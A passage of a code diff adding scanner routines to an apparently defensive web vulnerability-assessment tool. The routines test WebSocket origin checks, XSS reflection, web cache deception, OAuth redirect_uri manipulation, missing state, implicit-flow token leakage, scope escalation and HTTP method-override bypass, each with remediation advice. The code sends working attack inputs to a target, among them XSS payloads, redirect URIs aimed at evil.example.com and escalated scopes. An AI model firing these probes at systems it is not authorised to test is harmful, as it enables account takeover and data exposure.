+                                       origin="https://evil.example.com",
+                                       cookies=_cookies)
+            sock.sendall(req)
+            resp = _ws_recv(sock, max_wait=timeout)
+            code = _ws_status(resp)
+            _ws_close(sock)
+            if code == 101:
+                _ev_content = (
+                    f"WebSocket upgrade to {ep['path']} succeeded with evil origin.\n\n"
+                    f"Request:\n{req.decode('utf-8', errors='replace')}\n\n"
+                    f"Response:\n{resp.decode('utf-8', errors='replace')[:2000]}"
+                )
+                _ev_path = ""
+                try:
+                    d = out.root / phase
+                    d.mkdir(parents=True, exist_ok=True)
+                    fp = d / f"ws_origin_{re.sub(r'[^a-zA-Z0-9_]', '_', ep['path'])[:40]}.txt"
+                    fp.write_text(_ev_content)
+                    _ev_path = str(fp.relative_to(out.root))
+                except Exception:
+                    pass
+                out.add_finding(
+                    title="WebSocket Missing Origin Validation",
+                    url=f"{scheme}://{hostname}:{port}{ep['path']}",
+                    port=target["port"], risk="MEDIUM",
+                    description=(
+                        f"The WebSocket endpoint at {ep['path']} accepted a connection "
+                        f"with Origin: https://evil.example.com. This allows cross-site "
+                        f"WebSocket hijacking (CSWSH) — a malicious page can open a WS "
+                        f"connection to the target and interact with the user's session."
+                    ),
+                    output=f"Path: {ep['path']}\nOrigin: https://evil.example.com\nResult: HTTP 101",
+                    output_file=_ev_path,
+                    sources="fracture-websocket", service=target["scheme"],
+                    affected=f"{scheme}://{hostname}:{port}{ep['path']}",
+                    owasp="A01:2025 Broken Access Control",
+                    nist="SC-23",
+                    cvss_score=5.3,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                    cwe=["CWE-1385", "CWE-346"],
+                    remediation=(
+                        "Validate the Origin header on WebSocket upgrade requests. Reject "
+                        "connections from untrusted origins. This is the WebSocket equivalent "
+                        "of CSRF protection."
+                    ),
+                )
+                vc.log(f"[websocket] Origin bypass on {ep['path']}", "SUCCESS")
+        except Exception:
+            pass
+
+    # ── Step 4: Message injection ─────────────────────────────────────────
+    vc.status(phase, "WebSocket Testing", "running", "Message injection", 3, 4)
+
+    _ws_test_messages = [
+        ('{"type":"ping"}', "ping"),
+        ('<script>alert("fracture_ws_xss")</script>', "xss"),
+        ('{"admin":true,"role":"administrator"}', "privesc"),
+        ('<img src=x onerror=alert(1)>', "xss_img"),
+    ]
+
+    for ep in _discovered_ws:
+        if ep["status"] != 101:
+            continue
+        try:
+            sock = _ws_connect(hostname, port, use_tls)
+            req, _key = _ws_handshake(ep["path"], cookies=_cookies)
+            sock.sendall(req)
+            resp = _ws_recv(sock, max_wait=timeout)
+            code = _ws_status(resp)
+            if code != 101:
+                _ws_close(sock)
+                continue
+
+            for msg, msg_type in _ws_test_messages:
+                try:
+                    _ws_send_text(sock, msg)
+                    frame_resp = _ws_read_frame(sock, max_wait=3.0)
+                    if frame_resp is None:
+                        continue
+                    # Check for XSS reflection
+                    if msg_type in ("xss", "xss_img") and (
+                        "fracture_ws_xss" in frame_resp
+                        or "<script>" in frame_resp
+                        or "onerror=" in frame_resp
+                    ):
+                        _ev_content = (
+                            f"WebSocket at {ep['path']} reflected XSS payload.\n\n"
+                            f"Sent: {msg}\nReceived: {frame_resp[:1000]}"
+                        )
+                        _ev_path = ""
+                        try:
+                            d = out.root / phase
+                            d.mkdir(parents=True, exist_ok=True)
+                            fp = d / f"ws_xss_{re.sub(r'[^a-zA-Z0-9_]', '_', ep['path'])[:40]}.txt"
+                            fp.write_text(_ev_content)
+                            _ev_path = str(fp.relative_to(out.root))
+                        except Exception:
+                            pass
+                        out.add_finding(
+                            title="WebSocket Message Injection (XSS)",
+                            url=f"{scheme}://{hostname}:{port}{ep['path']}",
+                            port=target["port"], risk="HIGH",
+                            description=(
+                                f"The WebSocket endpoint at {ep['path']} reflected an XSS "
+                                f"payload back in its response frame. If this message is "
+                                f"rendered in a browser DOM by the client application, it "
+                                f"enables cross-site scripting."
+                            ),
+                            output=f"Path: {ep['path']}\nSent: {msg}\nReceived: {frame_resp[:500]}",
+                            output_file=_ev_path,
+                            sources="fracture-websocket", service=target["scheme"],
+                            affected=f"{scheme}://{hostname}:{port}{ep['path']}",
+                            owasp="A03:2025 Injection",
+                            nist="SI-10",
+                            cvss_score=7.1,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L",
+                            cwe=["CWE-79"],
+                            remediation=(
+                                "Sanitize all WebSocket message content before processing or "
+                                "rendering. Apply the same input validation and output encoding "
+                                "rules as for HTTP request parameters."
+                            ),
+                        )
+                        vc.log(f"[websocket] XSS reflected on {ep['path']}", "SUCCESS")
+                        break  # One XSS finding per endpoint is enough
+                except Exception:
+                    pass
+
+            _ws_close(sock)
+        except Exception:
+            pass
+
+    vc.status(phase, "WebSocket Testing", "complete", "Done", 4, 4)
+    vc.log("[websocket] Phase complete", "SUCCESS")
+
+
+# =============================================================================
+# Test: Web Cache Deception
+# =============================================================================
+# CWE-525: Use of Web Browser Cache Containing Sensitive Information
+
+def _test_web_cache_deception(target: dict, cfg: dict, out: OutputManager,
+                              sess: requests.Session) -> None:
+    """Test for web cache deception vulnerabilities.
+
+    Appends static-looking extensions to authenticated URLs to check if
+    reverse proxies / CDNs cache the response and serve it to others.
+    """
+    phase   = "web_cache_deception"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+
+    vc.status(phase, "Cache Deception", "running", "Testing", 0, 2)
+
+    # Build a list of URLs to test — the base authenticated URL plus any
+    # known authenticated paths (from session landing or cfg)
+    _test_urls = [url.rstrip("/")]
+    _auth_cfg = cfg.get("auth", {})
+    _landing = _auth_cfg.get("landing_url", "")
+    if _landing and _landing.rstrip("/") != _test_urls[0]:
+        _test_urls.append(_landing.rstrip("/"))
+
+    _cache_suffixes = [
+        "/nonexistent.css",
+        "/nonexistent.js",
+        "/nonexistent.jpg",
+        "/nonexistent.ico",
+        "/nonexistent.woff2",
+        ";/style.css",                 # path parameter injection
+        "%2Fstatic.css",               # encoded path confusion
+        "/..%2Fstatic%2Fstyle.css",    # dot-segment path confusion
+    ]
+
+    _cache_hit_indicators = re.compile(
+        r"x-cache:\s*hit|x-cache-hits:\s*[1-9]|cf-cache-status:\s*hit|"
+        r"x-varnish-cache:\s*hit|x-proxy-cache:\s*hit|"
+        r"age:\s*[1-9]",
+        re.IGNORECASE,
+    )
+
+    _authenticated_markers = re.compile(
+        r"(?:logout|sign.?out|my.?account|my.?profile|dashboard|welcome.back|"
+        r"logged.in.as|user.?name|email.*@|session|csrf.token|__RequestVerification)",
+        re.IGNORECASE,
+    )
+
+    _found: set = set()
+
+    for base_url in _test_urls:
+        # Get baseline authenticated response
+        try:
+            _bl = sess.get(base_url, timeout=timeout, allow_redirects=True)
+        except Exception:
+            continue
+        if not _bl or _bl.status_code != 200:
+            continue
+        _bl_has_auth = bool(_authenticated_markers.search(_bl.text[:5000]))
+        if not _bl_has_auth:
+            continue  # Page doesn't look authenticated — skip
+
+        for suffix in _cache_suffixes:
+            deception_url = base_url + suffix
+            if deception_url in _found:
+                continue
+            try:
+                # First request — prime the cache with authenticated content
+                r1 = sess.get(deception_url, timeout=timeout, allow_redirects=False)
+                if not r1 or r1.status_code not in (200, 301, 302):
+                    continue
+
+                # Check Cache-Control
+                _cc = r1.headers.get("Cache-Control", "").lower()
+                _is_public = "public" in _cc or (
+                    "private" not in _cc and "no-cache" not in _cc and "no-store" not in _cc
+                )
+
+                # Check for cache hit headers
+                _headers_str = "\n".join(f"{k}: {v}" for k, v in r1.headers.items())
+                _has_cache_hit = bool(_cache_hit_indicators.search(_headers_str))
+
+                # Check if response body contains authenticated content
+                _body_has_auth = bool(_authenticated_markers.search(r1.text[:5000]))
+
+                if r1.status_code == 200 and _body_has_auth and (_is_public or _has_cache_hit):
+                    # Potential cache deception — now verify by requesting
+                    # the same URL without auth cookies
+                    _unauth_sess = requests.Session()
+                    _unauth_sess.verify = cfg.get("verify_ssl", False)
+                    _unauth_sess.headers.update({"User-Agent": sess.headers.get("User-Agent", "")})
+                    try:
+                        r2 = _unauth_sess.get(deception_url, timeout=timeout,
+                                              allow_redirects=False)
+                        _r2_has_auth = bool(
+                            r2 and r2.status_code == 200
+                            and _authenticated_markers.search(r2.text[:5000])
+                        )
+                    except Exception:
+                        _r2_has_auth = False
+
+                    _severity = "HIGH" if _r2_has_auth else "MEDIUM"
+                    _confirmed = " (CONFIRMED)" if _r2_has_auth else " (potential)"
+                    _found.add(deception_url)
+
+                    _rq, _rp = _save_http_evidence(
+                        out, phase, f"cache_deception_{suffix.replace('/', '_')[:30]}", r1,
+                    )
+                    out.add_finding(
+                        title=f"Web Cache Deception{_confirmed}",
+                        url=deception_url, port=target["port"], risk=_severity,
+                        description=(
+                            f"The server returned authenticated page content when the URL "
+                            f"'{deception_url}' was requested. The response Cache-Control "
+                            f"header ({_cc or 'absent'}) does not prevent caching, and "
+                            f"{'cache-hit headers were present' if _has_cache_hit else 'the response may be cached by intermediaries'}. "
+                            + (f"An unauthenticated request to the same URL returned the "
+                               f"cached authenticated content, confirming the vulnerability."
+                               if _r2_has_auth else
+                               f"An unauthenticated request did not return cached content, "
+                               f"but the conditions for cache deception exist.")
+                        ),
+                        output=(
+                            f"URL: {deception_url}\n"
+                            f"Auth response: HTTP {r1.status_code}, {len(r1.text)} bytes\n"
+                            f"Cache-Control: {_cc or '(none)'}\n"
+                            f"Cache headers: {_headers_str[:300]}\n"
+                            f"Auth content present: {_body_has_auth}\n"
+                            + (f"Unauth response: HTTP {r2.status_code}, auth content: {_r2_has_auth}"
+                               if _r2_has_auth else "")
+                        ),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-cache-deception", service=target["scheme"],
+                        affected=deception_url,
+                        owasp="A05:2025 Security Misconfiguration",
+                        nist="SC-28",
+                        remediation=(
+                            "Configure the reverse proxy or CDN to never cache responses "
+                            "that contain session cookies or authenticated content. Set "
+                            "'Cache-Control: no-store, private' on all authenticated pages. "
+                            "Reject or 404 requests with unexpected file extensions appended "
+                            "to application paths."
+                        ),
+                        cvss_score=7.5,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                        cwe=["CWE-525"],
+                    )
+                    vc.log(f"[cache_deception] Cache deception{_confirmed}: {suffix}", "SUCCESS")
+                    break  # One finding per base URL is enough
+            except Exception:
+                pass
+
+    vc.status(phase, "Cache Deception", "complete", "Done", 2, 2)
+    vc.log("[web_cache_deception] Test complete", "SUCCESS")
+
+
+# =============================================================================
+# Test: OAuth / OIDC / SAML Flow Vulnerabilities
+# =============================================================================
+# CWE-601: URL Redirection to Untrusted Site (redirect_uri)
+# CWE-352: CSRF (missing state)
+# CWE-200: Exposure of Sensitive Information (token leakage)
+
+def _test_oauth_flows(target: dict, cfg: dict, out: OutputManager,
+                      sess: requests.Session, crawl_data: dict) -> None:
+    """Test OAuth/OIDC/SAML flow vulnerabilities.
+
+    Discovers OAuth endpoints, tests redirect_uri manipulation, missing state
+    parameter, token leakage via URL, and scope escalation.
+    """
+    phase   = "oauth_flows"
+    url     = target["url"]
+    hostname = target["hostname"]
+    timeout = cfg.get("timeout", 10)
+    scheme  = target["scheme"]
+
+    vc.status(phase, "OAuth Flow Testing", "running", "Discovery", 0, 5)
+
+    # ── Step 1: Discover OAuth endpoints ──────────────────────────────────
+
+    _oidc_urls = [
+        "/.well-known/openid-configuration",
+        "/.well-known/oauth-authorization-server",
+        "/oauth/authorize",
+        "/oauth2/authorize",
+        "/connect/authorize",
+        "/auth/realms/master/.well-known/openid-configuration",  # Keycloak
+        "/adfs/.well-known/openid-configuration",                # ADFS
+        "/v2.0/.well-known/openid-configuration",                # Azure AD
+    ]
+
+    _oauth_config: dict = {}
+    _authorize_url = ""
+    _token_url = ""
+    _redirect_uris_found: list = []
+    _scope_found = ""
+    _client_id_found = ""
+
+    # Check well-known endpoints
+    base = f"{scheme}://{hostname}" if target["port"] in (80, 443) else f"{scheme}://{hostname}:{target['port']}"
+    for oidc_path in _oidc_urls:
+        try:
+            r = sess.get(base + oidc_path, timeout=timeout, allow_redirects=False)
+            if r and r.status_code == 200:
+                try:
+                    _oauth_config = r.json()
+                    _authorize_url = _oauth_config.get("authorization_endpoint", "")
+                    _token_url = _oauth_config.get("token_endpoint", "")
+                    vc.log(f"[oauth] OpenID config found at {oidc_path}", "SUCCESS")
+                    break
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    # Scan crawl data for OAuth patterns
+    _oauth_re = re.compile(
+        r"(?:authorize\?|client_id=|redirect_uri=|response_type=|scope=|"
+        r"oauth|openid|/auth/|/login/oauth|/sso/)",
+        re.IGNORECASE,
+    )
+
+    for link in crawl_data.get("links", []):
+        if _oauth_re.search(link):
+            parsed = urllib.parse.urlparse(link)
+            qs = urllib.parse.parse_qs(parsed.query)
+            if "redirect_uri" in qs:
+                _redirect_uris_found.extend(qs["redirect_uri"])
+            if "client_id" in qs and not _client_id_found:
+                _client_id_found = qs["client_id"][0]
+            if "scope" in qs and not _scope_found:
+                _scope_found = qs["scope"][0]
+            if not _authorize_url and "authorize" in link.lower():
+                _authorize_url = link.split("?")[0]
+
+    # Also scan JS content for OAuth patterns
+    for lnk in crawl_data.get("links", [])[:15]:
+        if not lnk.endswith(".js"):
+            continue
+        try:
+            r = sess.get(lnk, timeout=timeout)
+            if r and r.status_code == 200:
+                # Find client_id
+                for m in re.finditer(r'client_id["\s:=]+["\']([a-zA-Z0-9_-]{8,})["\']', r.text):
+                    if not _client_id_found:
+                        _client_id_found = m.group(1)
+                # Find redirect_uri
+                for m in re.finditer(r'redirect_uri["\s:=]+["\'](https?://[^\s"\']+)["\']', r.text):
+                    _redirect_uris_found.append(m.group(1))
+                # Find authorize URL
+                if not _authorize_url:
+                    for m in re.finditer(r'(https?://[^\s"\']+/(?:oauth2?|connect)/authorize)', r.text):
+                        _authorize_url = m.group(1)
+                # Find scope
+                if not _scope_found:
+                    for m in re.finditer(r'scope["\s:=]+["\']([\w\s.]+)["\']', r.text):
+                        _scope_found = m.group(1)
+        except Exception:
+            pass
+
+    if not _authorize_url and not _oauth_config and not _redirect_uris_found:
+        vc.status(phase, "OAuth Flow Testing", "complete", "No OAuth endpoints found", 5, 5)
+        vc.log("[oauth] No OAuth/OIDC endpoints discovered — skipping", "INFO")
+        return
+
+    vc.log(f"[oauth] authorize={_authorize_url or '(unknown)'}, "
+           f"client_id={_client_id_found or '(unknown)'}, "
+           f"redirect_uris={len(_redirect_uris_found)}", "INFO")
+
+    # ── Step 2: redirect_uri manipulation ─────────────────────────────────
+    vc.status(phase, "OAuth Flow Testing", "running", "redirect_uri testing", 1, 5)
+
+    if _authorize_url and _client_id_found:
+        _evil_redirects = [
+            ("https://evil.example.com/callback", "external domain"),
+            (f"{scheme}://{hostname}@evil.example.com/callback", "URL confusion (@)"),
+            (f"{scheme}://{hostname}.evil.example.com/callback", "subdomain append"),
+            (f"{scheme}://{hostname}%00.evil.example.com/callback", "null byte"),
+            (f"{scheme}://{hostname}/callback/../../../evil", "path traversal"),
+        ]
+
+        for evil_uri, desc in _evil_redirects:
+            try:
+                _auth_params = {
+                    "client_id": _client_id_found,
+                    "redirect_uri": evil_uri,
+                    "response_type": "code",
+                    "scope": _scope_found or "openid",
+                }
+                r = sess.get(_authorize_url, params=_auth_params, timeout=timeout,
+                             allow_redirects=False)
+                if not r:
+                    continue
+                # Check if the server accepted the evil redirect_uri
+                loc = r.headers.get("Location", "")
+                if r.status_code in (301, 302, 303, 307, 308):
+                    # If it redirects to the evil URI, it's vulnerable
+                    if "evil.example.com" in loc or evil_uri in loc:
+                        _rq, _rp = _save_http_evidence(out, phase,
+                                                        f"oauth_redir_{desc.replace(' ', '_')[:20]}", r)
+                        out.add_finding(
+                            title=f"OAuth redirect_uri Open Redirect — {desc}",
+                            url=_authorize_url, port=target["port"], risk="HIGH",
+                            description=(
+                                f"The OAuth authorization endpoint accepted a manipulated "
+                                f"redirect_uri ({evil_uri}). The server redirected to this "
+                                f"URL, which would expose the authorization code to an "
+                                f"attacker-controlled domain."
+                            ),
+                            output=(
+                                f"Authorization URL: {_authorize_url}\n"
+                                f"Evil redirect_uri: {evil_uri}\n"
+                                f"Response: HTTP {r.status_code}\n"
+                                f"Location: {loc[:500]}"
+                            ),
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-oauth", service=target["scheme"],
+                            affected=_authorize_url,
+                            owasp="A07:2025 Identification and Authentication Failures",
+                            nist="IA-8",
+                            cvss_score=7.4,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N",
+                            cwe=["CWE-601"],
+                            remediation=(
+                                "Implement strict redirect_uri validation. Use exact-match "
+                                "comparison against pre-registered redirect URIs. Do not "
+                                "allow wildcards, path traversal, or URL manipulation."
+                            ),
+                        )
+                        vc.log(f"[oauth] redirect_uri bypass: {desc}", "SUCCESS")
+                        break
+                elif r.status_code == 200 and "evil.example.com" not in r.text:
+                    # Server showed a consent/error page — redirect_uri validation
+                    # is working (or the error is about something else)
+                    pass
+            except Exception:
+                pass
+
+    # ── Step 3: Missing state parameter ───────────────────────────────────
+    vc.status(phase, "OAuth Flow Testing", "running", "State parameter check", 2, 5)
+
+    if _authorize_url and _client_id_found:
+        _redir = _redirect_uris_found[0] if _redirect_uris_found else f"{url}/callback"
+        try:
+            _no_state_params = {
+                "client_id": _client_id_found,
+                "redirect_uri": _redir,
+                "response_type": "code",
+                "scope": _scope_found or "openid",
+                # Deliberately omit state parameter
+            }
+            r = sess.get(_authorize_url, params=_no_state_params, timeout=timeout,
+                         allow_redirects=False)
+            if r and r.status_code in (200, 301, 302, 303, 307, 308):
+                loc = r.headers.get("Location", "")
+                # If the server redirected without requiring state, it's vulnerable
+                _proceeds = (
+                    r.status_code in (301, 302, 303, 307, 308)
+                    and "error" not in loc.lower()
+                    and "invalid" not in loc.lower()
+                )
+                # Or if it showed a consent page (200) without error about missing state
+                if not _proceeds and r.status_code == 200:
+                    _proceeds = (
+                        "consent" in r.text.lower()
+                        or "authorize" in r.text.lower()
+                        or "allow" in r.text.lower()
+                    ) and "state" not in r.text.lower()[:500]
+
+                if _proceeds:
+                    _rq, _rp = _save_http_evidence(out, phase, "oauth_no_state", r)
+                    out.add_finding(
+                        title="OAuth Missing State Parameter (CSRF)",
+                        url=_authorize_url, port=target["port"], risk="MEDIUM",
+                        description=(
+                            f"The OAuth authorization endpoint processed a request without "
+                            f"the 'state' parameter. The state parameter prevents CSRF attacks "
+                            f"on the OAuth flow — without it, an attacker can initiate an "
+                            f"authorization flow and trick a victim into linking their account "
+                            f"to the attacker's."
+                        ),
+                        output=(
+                            f"Authorization URL: {_authorize_url}\n"
+                            f"Request without state: {_no_state_params}\n"
+                            f"Response: HTTP {r.status_code}\n"
+                            f"Location: {loc[:300]}"
+                        ),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-oauth", service=target["scheme"],
+                        affected=_authorize_url,
+                        owasp="A07:2025 Identification and Authentication Failures",
+                        nist="IA-8",
+                        cvss_score=5.3,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                        cwe=["CWE-352"],
+                        remediation=(
+                            "Always require and validate the 'state' parameter in OAuth "
+                            "authorization requests. Generate a cryptographically random "
+                            "state value tied to the user's session and verify it in the "
+                            "callback."
+                        ),
+                    )
+                    vc.log("[oauth] State parameter not required — CSRF possible", "SUCCESS")
+        except Exception:
+            pass
+
+    # ── Step 4: Token leakage via URL ─────────────────────────────────────
+    vc.status(phase, "OAuth Flow Testing", "running", "Token leakage check", 3, 5)
+
+    # Check if the authorization endpoint uses response_type=token (implicit flow)
+    if _authorize_url and _client_id_found:
+        _redir = _redirect_uris_found[0] if _redirect_uris_found else f"{url}/callback"
+        try:
+            _token_params = {
+                "client_id": _client_id_found,
+                "redirect_uri": _redir,
+                "response_type": "token",
+                "scope": _scope_found or "openid",
+                "state": "fracture_test",
+            }
+            r = sess.get(_authorize_url, params=_token_params, timeout=timeout,
+                         allow_redirects=False)
+            if r and r.status_code in (301, 302, 303, 307, 308):
+                loc = r.headers.get("Location", "")
+                # Implicit flow puts token in fragment (#access_token=...)
+                if "access_token=" in loc or "token=" in loc:
+                    _rq, _rp = _save_http_evidence(out, phase, "oauth_token_leak", r)
+                    out.add_finding(
+                        title="OAuth Token Leakage via URL (Implicit Flow)",
+                        url=_authorize_url, port=target["port"], risk="HIGH",
+                        description=(
+                            f"The OAuth endpoint supports the implicit flow "
+                            f"(response_type=token), which returns access tokens directly "
+                            f"in the URL fragment. Tokens in URLs are logged in browser "
+                            f"history, server logs, and can leak via the Referer header. "
+                            f"The implicit flow is deprecated in OAuth 2.1."
+                        ),
+                        output=(
+                            f"Authorization URL: {_authorize_url}\n"
+                            f"response_type: token\n"
+                            f"Location header contains token: {loc[:300]}"
+                        ),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-oauth", service=target["scheme"],
+                        affected=_authorize_url,
+                        owasp="A07:2025 Identification and Authentication Failures",
+                        nist="SC-12",
+                        cvss_score=7.5,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                        cwe=["CWE-200", "CWE-598"],
+                        remediation=(
+                            "Disable the implicit flow (response_type=token). Use the "
+                            "authorization code flow with PKCE instead. OAuth 2.1 formally "
+                            "deprecates the implicit grant."
+                        ),
+                    )
+                    vc.log("[oauth] Implicit flow enabled — token in URL", "SUCCESS")
+        except Exception:
+            pass
+
+    # ── Step 5: Scope escalation ──────────────────────────────────────────
+    vc.status(phase, "OAuth Flow Testing", "running", "Scope escalation", 4, 5)
+
+    if _authorize_url and _client_id_found and _scope_found:
+        _redir = _redirect_uris_found[0] if _redirect_uris_found else f"{url}/callback"
+        _escalated_scopes = [
+            (_scope_found + " admin", "admin"),
+            ("openid profile email offline_access", "offline_access"),
+            (_scope_found + " write", "write"),
+            (_scope_found + " user:admin", "user:admin"),
+        ]
+        for escalated_scope, scope_desc in _escalated_scopes:
+            if escalated_scope.strip() == _scope_found.strip():
+                continue
+            try:
+                _esc_params = {
+                    "client_id": _client_id_found,
+                    "redirect_uri": _redir,
+                    "response_type": "code",
+                    "scope": escalated_scope,
+                    "state": "fracture_test",
+                }
+                r = sess.get(_authorize_url, params=_esc_params, timeout=timeout,
+                             allow_redirects=False)
+                if not r:
+                    continue
+                loc = r.headers.get("Location", "")
+                # If it redirects with a code (no error), the scope may have been accepted
+                if r.status_code in (301, 302, 303, 307, 308):
+                    if "code=" in loc and "error" not in loc.lower():
+                        _rq, _rp = _save_http_evidence(
+                            out, phase, f"oauth_scope_{scope_desc}", r)
+                        out.add_finding(
+                            title=f"OAuth Scope Escalation — {scope_desc}",
+                            url=_authorize_url, port=target["port"], risk="HIGH",
+                            description=(
+                                f"The OAuth authorization endpoint accepted an escalated "
+                                f"scope '{escalated_scope}' beyond the application's "
+                                f"original scope '{_scope_found}'. This may grant elevated "
+                                f"privileges to the access token."
+                            ),
+                            output=(
+                                f"Authorization URL: {_authorize_url}\n"
+                                f"Original scope: {_scope_found}\n"
+                                f"Escalated scope: {escalated_scope}\n"
+                                f"Response: HTTP {r.status_code}\n"
+                                f"Location: {loc[:300]}"
+                            ),
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-oauth", service=target["scheme"],
+                            affected=_authorize_url,
+                            owasp="A01:2025 Broken Access Control",
+                            nist="AC-6",
+                            cvss_score=8.1,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                            cwe=["CWE-269"],
+                            remediation=(
+                                "Enforce strict scope validation. Only allow scopes that "
+                                "are pre-registered for the client application. Reject or "
+                                "strip unauthorized scopes from authorization requests."
+                            ),
+                        )
+                        vc.log(f"[oauth] Scope escalation accepted: {scope_desc}", "SUCCESS")
+                        break
+                elif r.status_code == 200:
+                    # Consent page shown — scope might be accepted, but need user
+                    # interaction. Log as informational.
+                    if "consent" in r.text.lower() and scope_desc in r.text.lower():
+                        vc.log(f"[oauth] Escalated scope '{scope_desc}' shown in consent page", "INFO")
+            except Exception:
+                pass
+
+    vc.status(phase, "OAuth Flow Testing", "complete", "Done", 5, 5)
+    vc.log("[oauth] OAuth flow testing complete", "SUCCESS")
+
+# ── Auth / Session / CSRF / GraphQL Extensions ──────────────────────
+
+
+def _test_verb_tunneling(target: dict, cfg: dict, out: "OutputManager",
+                         sess: "requests.Session",
+                         crawl_data: dict) -> None:
+    """Test HTTP method override headers to bypass method restrictions."""
+    phase   = "verb_tunneling"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    vc.status(phase, "Verb Tunneling", "running", "Collecting endpoints", 0, 1)
+
+    # Gather endpoints from crawl data or fall back to base URL
+    endpoints: list = []
+    for link in (crawl_data or {}).get("links", []):
+        _u = link if isinstance(link, str) else link.get("url", "")
+        if _u and _u not in endpoints:
+            endpoints.append(_u)
+    if not endpoints:
+        endpoints = [url]
+    endpoints = endpoints[:5]
+
+    _override_headers = [
+        ("X-HTTP-Method-Override", "DELETE"),
+        ("X-HTTP-Method", "PUT"),
+        ("X-Method-Override", "PATCH"),
+        ("X-HTTP-Method-Override", "TRACE"),
+    ]
+    _found: set = set()
+
+    for ep_url in endpoints:
+        if ep_url in _found:
+            continue
+        # Baseline: normal POST
+        try:
+            baseline = sess.post(ep_url, timeout=timeout, allow_redirects=False)
+        except Exception:
+            continue
+        bl_status = baseline.status_code
+
+        for hdr_name, hdr_method in _override_headers:
+            try:
+                r = sess.post(ep_url, timeout=timeout, allow_redirects=False,
+                              headers={hdr_name: hdr_method})
+                # If baseline was 405/403 but override returns 200/204, or
+                # if the response differs materially, flag it
+                if r.status_code in (200, 204) and bl_status in (405, 403, 404):
+                    _found.add(ep_url)
+                    _rq, _rp = _save_http_evidence(
+                        out, phase, f"verb_tunnel_{hdr_method}",
+                        r, endpoint_url=ep_url, method="POST")
+                    out.add_finding(
+                        title=f"HTTP Method Override Bypass: {hdr_method} via {hdr_name}",
+                        url=ep_url, port=target["port"], risk="MEDIUM",
+                        description=(
+                            f"The endpoint at {ep_url} accepted a POST request with "
+                            f"'{hdr_name}: {hdr_method}' and returned HTTP {r.status_code}, "
+                            f"while a normal POST returned HTTP {bl_status}. This indicates "
+                            f"the server honours method override headers, allowing an attacker "
+                            f"to bypass method-based access controls."
+                        ),
+                        output=(f"Endpoint: {ep_url}\n"
+                                f"Header: {hdr_name}: {hdr_method}\n"
+                                f"Baseline POST: HTTP {bl_status}\n"
+                                f"Overridden: HTTP {r.status_code}"),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-verb-tunneling",
+                        service=target["scheme"], affected=ep_url,
+                        owasp="A01:2025 Broken Access Control", nist="AC-3",
+                        cvss_score=5.3,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                        cwe=["CWE-650"],
+                        remediation=(
+                            "Disable support for X-HTTP-Method-Override, X-HTTP-Method, and "
+                            "X-Method-Override headers unless explicitly required. Enforce "
+                            "method restrictions at the framework or reverse-proxy level."
+                        ),
+                        http_code=r.status_code,
+                    )
+                    vc.log(f"[verb_tunneling] Override bypass at {ep_url} via {hdr_name}: {hdr_method}", "SUCCESS")
+                    break  # one finding per endpoint is enough
+            except Exception:
+                pass
+
+        # Also test _method form parameter (Rails/Laravel convention)
+        if ep_url not in _found:
+            for override_method in ("DELETE", "PUT"):
+                try:
+                    r = sess.post(ep_url, data={"_method": override_method},
+                                  timeout=timeout, allow_redirects=False)
+                    if r.status_code in (200, 204) and bl_status in (405, 403, 404):
+                        _found.add(ep_url)
+                        _rq, _rp = _save_http_evidence(
+                            out, phase, f"verb_tunnel_param_{override_method}",
+                            r, endpoint_url=ep_url, method="POST")
+                        out.add_finding(
+                            title=f"HTTP Method Override Bypass: {override_method} via _method Parameter",
+                            url=ep_url, port=target["port"], risk="MEDIUM",
+                            description=(
+                                f"The endpoint at {ep_url} accepted a POST request with "
+                                f"'_method={override_method}' form parameter and returned "
+                                f"HTTP {r.status_code}, while a normal POST returned "
+                                f"HTTP {bl_status}. The server processes Rails/Laravel-style "
+                                f"method override parameters."
+                            ),
+                            output=(f"Endpoint: {ep_url}\n"
+                                    f"Parameter: _method={override_method}\n"
+                                    f"Baseline POST: HTTP {bl_status}\n"
+                                    f"Overridden: HTTP {r.status_code}"),
+                            output_file=f"{_rq},{_rp}",
+                            sources="fracture-verb-tunneling",
+                            service=target["scheme"], affected=ep_url,
+                            owasp="A01:2025 Broken Access Control", nist="AC-3",
+                            cvss_score=5.3,
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                            cwe=["CWE-650"],
+                            remediation=(
+                                "Disable _method parameter processing in production. "
+                                "Enforce method restrictions at the web server or reverse-proxy level."
+                            ),
+                            http_code=r.status_code,
+                        )
+                        vc.log(f"[verb_tunneling] _method param bypass at {ep_url}", "SUCCESS")
+                        break
+                except Exception:
+                    pass
+
+    vc.status(phase, "Verb Tunneling", "complete", "Done", 1, 1)
+    vc.log("[verb_tunneling] Phase complete", "SUCCESS")
+
+
+def _test_mfa_bypass(target: dict, cfg: dict, out: "OutputManager",
+                     sess: "requests.Session",
+                     crawl_data: dict) -> None:
+    """Test MFA/2FA bypass techniques — safe, max 5 total attempts."""
+    phase   = "mfa_bypass"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    forms   = (crawl_data or {}).get("forms", [])
+    links   = (crawl_data or {}).get("links", [])
+    vc.status(phase, "MFA Bypass", "running", "Detecting MFA", 0, 4)
+
